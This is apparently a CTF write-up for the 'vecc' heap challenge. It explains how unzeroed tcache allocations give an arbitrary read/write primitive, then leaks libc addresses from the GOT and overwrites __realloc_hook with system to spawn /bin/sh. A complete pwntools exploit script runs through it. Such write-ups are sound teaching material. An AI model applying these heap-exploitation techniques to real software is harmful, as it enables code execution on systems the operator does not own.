# VECC Writeup

This is a hard heap exploitation challenge.

The idea is to first obtain a read/write primitive on the heap, then progressively leak data until you know the location of libc, then overwrite the `__realloc_hook` to call `system(/bin/sh)`.

## 1 - Identifying the vulnerability

The first thing to note when inspecting the binary logic is that bounds are being checked correctly so we have no buffer overflows or heap corruption, and there are no obvious double-frees or use-after-frees, however there is the glaring vulnerability that allocations are never zeroed and we must leverage this and only this to get a shell.

## 2 - The essence of the vulnerability

For this exploit all you need is the tcache. There are the `vecc`s - which are simillar to c++'s `std::vector` or rust's `Vec`. This is a small struct with a pointer (to a buffer), a length (of the used portion of the buffer), and a capacity (the maximum buffer length before reallocation is necessary). When a vecc is first created all fields should be NULLed to signal that a new buffer must be allocated upon first usage.

The key here is to notice that since allocations are not zeroed it is possible to groom the stack, then allocate a vecc from a tcache chunk without erasing the data on it.

This means that your allocated struct will leave the pointer as the `fd` pointer of the chunk from the tcache, as well as leaving the length and capacity unchanged from when the chunk was freed.

Furthermore since we have some control over the stack, it is possible to force this chunk `fd` pointer to point to another vecc struct as if it was the buffer of our new allocation.

```
 A                  B
+-----------+      +-----------+      +-----------+
| buf +----------> | buf +----------> | actual    |
+-----+-----+      +-----+-----+      | buffer    |
| len | cap |      | len | cap |      |           |
+-----+-----+      +-----+-----+      +-----------+
```

Once we have the above structure we are free to use A to overwrite all 3 fields of B as if it was a regular byte buffer, then use B to read or write data at will.

This is made a little more difficult in that we do not have arbitrary write on the buffer of any of our veccs, instead we only have the ability to clear and append to the buffers.

The clear operation simply zeroes the `len` field of the struct and does nothing else.

The append operation is a little more complicated, it:
- Allocates a temporary buffer of user defined size n
- Reads n bytes into the temporary buffer
- Checks whether `len` + n > `cap` - this would overflow the buffer
- If necessary reallocates the vecc's buffer to the next power of 2 size that would fit the existing buffer and the n new bytes while copying the data across, `cap` it also updated
- Append the user data from the temporary buffer to the vecc's buffer now that we're sure we can not overflow it
- Free the temporary buffer
- Update the `len` to reflect the size of the new used portion of the buffer

The end result is that a temp buffer is allocated and freed, and the vecc's buffer is possibly reallocated to fit the required size, then the user data is appended to the vecc's existing data.

Once we have our crafted heap structure we can use a clear, followed by an append to overwrite the entire vecc struct at will.

## 3 - The exploit

For this exploit we first do some housekeeping since we have a shell

```python
from pwn import *

def exit_proc():
	p.recvuntil("> ")
	p.sendline("0")

def create_vecc(index):
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()

def destroy_vecc(index):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()

def append_vecc(index, buffer, readline=True):
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()
	p.sendline("{}".format(len(buffer)))
	p.send(buffer)
	if readline:
		p.recvline()

def clear_vecc(index):
	p.recvuntil("> ")
	p.sendline("4")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	p.recvline()

def show_vecc(index, bytes):
	p.recvuntil("> ")
	p.sendline("5")
	p.recvuntil("> ")
	p.sendline("{}".format(index))
	return p.recv(bytes)

# p = remote("localhost", 1337)
p = process("../publish/vecc")
```

This simply reflects all of the shell commands we might need to use. Now lets get to grooming the heap for our primitive.

```python
create_vecc(0)
append_vecc(0, b"A" * 0x10)
```

We first create a vecc struct then append bytes to it.

It is important to write 0x10 bytes to this buffer since our aim is to have this buffer later interpreted as a vecc struct. For this to work we must make sure that it will be placed in the same tcache bin as a vecc struct would and therefore we should match the size of the vecc struct.

Note that this will also allocate and free a temporary buffer of size 0x10 while user data is read in, we now have 1 chunk in the tcache.

```python
destroy_vecc(0)
```

After this line first the vecc's buffer will be freed, then the vecc will be NULLed and freed.

Now the tcache looks like this:

```
tcachebin:

(was vecc)         (was buffer)       (was temp)
+-----------+      +-----------+      +-----------+
| fd  +----------> | fd  +----------> | fd = NULL |
| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |
| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |
+-----------+      +-----------+      +-----------+
```

Finally we complete our crafted structure:

```python
create_vecc(1)
create_vecc(2)
create_vecc(3)
```

Now we have allocated back from the tcache with some new structure:

```
 1                  2                  3
+-----------+      +-----------+      +-----------+
| buf +----------> | buf +----------> | buf = NULL|
+-----+-----+      +-----+-----+      +-----+-----|
| 000 | 000 |      | AAA | AAA |      | AAA | AAA |
+-----+-----+      +-----+-----+      +-----------+
```

Since 1 has capacity 0 any write will resule in a reallocation, so we don't touch 1 from now on, but now with 2 and 3 we have the same structure as in the original diagram - we are able to use 2 to overwrite the entire of 3, then utilise 3 for arbitrary read / write.

Now we know we have PIE disabled, therefore we are able to leak libc addresses from the GOT.

```python
puts_got = 0x601fa0
clear_vecc(2)
append_vecc(2, p64(puts_got) + p32(8) + b"AAAA")
puts_libc = u64(show_vecc(3, 8))

print("Puts address: {}".format(hex(puts_libc)))

free_got = 0x601f90
clear_vecc(2)
append_vecc(2, p64(free_got) + p32(8) + b"AAAA")
free_libc = u64(show_vecc(3, 8))

print("Free address: {}".format(hex(free_libc)))
```

This is enough to figure out the version of libc being used and the location of any other symbols needed.

```python
libc_base = puts_libc - 0x809c0
system = libc_base + 0x4f440
realloc_hook = libc_base + 0x3ebc28
str_bin_sh = libc_base + 0x1b3e9a

print("Realloc hook address: {}".format(hex(realloc_hook)))
```

Now we overwrite our realloc hook with the address of `system`.

```python
clear_vecc(2)
append_vecc(2, p64(realloc_hook) + p32(0) + b"AAAA")
append_vecc(3, p64(system))
```

Finally, we overwrite the buffer pointer of one of our vecc structures with a pointer to "/bin/sh" from within libc, then trigger a reallocation by appending a single extra byte, giving us a shell.

```python
clear_vecc(2)
append_vecc(2, p64(str_bin_sh) + p32(8) + p32(8))
append_vecc(3, "A", readline=False)

p.interactive()
```
